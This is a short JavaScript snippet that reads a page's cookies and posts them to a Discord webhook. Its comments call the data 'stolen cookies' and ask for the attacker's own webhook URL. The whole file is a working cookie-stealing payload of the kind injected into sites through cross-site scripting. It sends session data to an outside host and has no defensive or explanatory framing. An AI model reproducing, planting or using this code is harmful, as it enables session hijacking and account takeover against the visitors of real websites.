var cookies = document.cookie;

// Create a new XMLHttpRequest
var xhr = new XMLHttpRequest();

// Set up the payload with your webhook URL and the stolen cookies
var payload = {
  content: cookies
};

// Send the payload to your Discord webhook
xhr.open("POST", "https://discord.com/api/webhooks/your-webhook-url", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify(payload));
